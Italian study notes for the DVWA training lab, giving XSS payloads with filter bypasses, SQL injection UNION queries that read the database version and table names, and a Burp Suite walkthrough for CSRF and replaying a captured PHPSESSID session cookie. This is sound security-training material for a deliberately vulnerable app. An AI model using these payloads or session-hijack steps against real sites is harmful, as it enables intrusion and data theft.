# DVWA

https://hub.docker.com/r/vulnerables/web-dvwa

https://www.blackmoreops.com/2018/11/13/configure-your-web-application-pentesting-lab/2/

xss = cross site scripting

## XSS Reflected

### Low

da 

```
?name=nome_inserito#
```

cambiamo aggiungiamo all'url lo script malevolo

```
?name=<script>alert(1)</script>
```

### Medium

in questo caso il tag script viene sostiut con un una stringa vuota tramite str_replace(), ma non controlla solamente `script`

```
?name=<Script>alert(1)</Script>
```

### High

in questo caso il case delle lettere viene preso in considerazione

```
?name=<img src=x onerror=alert(1)>
```

bypassiamo la funzione php che impediva di eseguire un qualsiasi comando che iniziava con `<script` 



## XSS DOM

### Low

come sopra, sostituiamo 

```
?default=French
```

con 

```
?default=French<script>alert('HACK')</script>
```

### Medium

non ammette tag script, nè maiuscolo nè minuscolo

```
?default=<</select><img src="#" onclick=alert("HACK")>
```

con # vediamo il contenuto del select

aggiungiamo poi un'immagine con codice malevolo 



## SQL Injection

### Low

```
%' or '0'='0
```

ci mostra l'intero contenuto della tabella

```
%' or 0=0 union select null, version() #
```

vediamo la versione del database, utile per eseguire exploit secifici

```
%' or 0=0 union select null, user() #
```

```
%' and 1=0 union select null, table_name from information_schema.tables #
```

```
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%' #
```

# Cross Site Request Forgery (CSRF)

va a sfruttare l'arhitettura di base del protocollo http e la sessione di autenticazione. Puà sfruttare sessioni aperte su un sito che non vengono chiuse alla chiusura del browser

**token csrf** rende impossibile all'utente malintenzionato di costruire una richiesta http (eg google authenticator)

generato dal server, privato e segreto

## per installare burpsuite

foxy proxy -ip 127.0.0.1 -porta 8080

burpsuite su google -> scarica certificato e importa su firefox (privacy&security-certificate-import)

## CSRF

burpsuite - proxy - lometto in ascolto -> cambio la password sul sito e intercetto il traffic con burpsuite

vediamo che c'è un cookie: PHPSESSID

burpsuite - repeater

si può usare il PHPSESSID per fare richieste come se fossimo l'utente loggato anche esternamente
